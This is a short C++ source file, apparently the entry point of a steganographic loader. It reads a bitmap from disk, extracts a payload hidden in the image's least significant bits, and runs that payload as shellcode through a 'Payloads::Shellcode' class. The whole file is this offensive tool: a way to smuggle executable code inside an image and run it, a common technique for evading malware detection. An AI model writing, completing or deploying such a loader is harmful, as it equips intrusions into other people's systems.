#include "reader.h"

int _tmain(int argc, TCHAR** argv) {
    if (argc == 3) {      
        // Init Gdiplus
        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

        // Do the job
        int payload_bits = _ttoi(argv[1]);
        LPCTSTR location = argv[2];

        // TEMPLATES GO HERE
        auto img = ImageSources::FileSystem();
        Bitmap* bmp = img.loadImage(location);


        auto alg = Algorithms::LSBM();
        uint8_t* payload_data = alg.readImage(bmp, payload_bits);


        auto pld = Payloads::Shellcode();
        pld.Run(payload_data, payload_bits);

        // Shutdown Gdiplus
        GdiplusShutdown(gdiplusToken);
    }
    return 0;
}